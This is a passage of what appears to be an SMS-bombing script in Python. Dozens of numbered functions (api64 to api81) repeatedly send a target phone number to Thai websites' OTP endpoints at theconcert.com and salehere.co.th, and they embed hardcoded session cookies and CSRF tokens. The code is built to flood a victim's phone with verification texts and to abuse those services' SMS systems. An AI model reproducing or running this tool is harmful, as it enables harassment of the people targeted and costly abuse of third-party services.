	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})

def api64():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api65():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api66():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})

def api67():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api68():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api69():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
def api70():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api71():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api72():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api73():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api74():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api75():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	

def api76():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api77():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api78():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api79():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api80():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api81():
head = {
	"content-type": "application/json",
	"accept": "*/*",
